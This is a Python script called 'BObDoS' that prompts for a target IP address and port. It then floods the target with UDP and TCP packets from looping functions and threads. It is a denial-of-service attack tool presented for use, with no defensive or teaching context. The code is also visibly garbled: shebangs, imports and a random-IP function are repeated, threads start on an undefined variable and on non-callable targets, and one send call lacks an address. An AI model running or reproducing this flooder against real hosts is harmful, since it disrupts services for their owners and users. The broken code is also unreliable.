#!/usr/bin/env python3
import socket
import threading
import os
import time
import pyfiglet
import os

os.system("pyfiglet --color=WHITE BObDoS")

import socket, threading
IP = input("IP: ")
PORT = int(input("PORTA: "))
print(":)")
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
import socket, threading
data = bytes.fromhex("AA AA AA")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((IP, PORT))
for i in range(0, 9999999999999):
    s.send(data)
s.close()
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
#!/usr/bin/env python3
import socket, threading, random
def run():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((IP,PORT))
			for i in range(999999999999999999999999999999999999):
				s.sendto(data)
			print("")
		except:
			print("")
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
#!/usr/bin/env python3
import socket, threading, random
def run2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((IP,PORT))
			s.send(data)
			for i in range(999999999999999999999999999999999999999999999999999999999999999):
				s.send(data)
			print("")
		except:
			s.close()
			print("")
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
import socket, threading
n = 0
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
def ataque():
    global n, s
    while True:
        s.connect((IP,PORT))
        s.sendto(bytes(str(n),'utf-8'),(IP, PORT))
        n+=1
threading.Thread(target=ataque, args=()).start()
threading.Thread(target = data)
th.start()
threading.Thread(target = IP)
th.start()
threading.Thread(target = run)
th.start()
threading.Thread(target = run2)
th.start()
threading.Thread(target = randomip)
th.start()
def new():
	threading.Thread(target = data)
	th.start()
	threading.Thread(target = run)
	th.start()
	threading.Thread(target = run2)
	th.start()
	threading.Thread(target=ataque, args=()).start()
threading.Thread(target = IP)
th.start()
threading.Thread(target = randomip)
th.start()
threading.Thread(target = new)
th.start()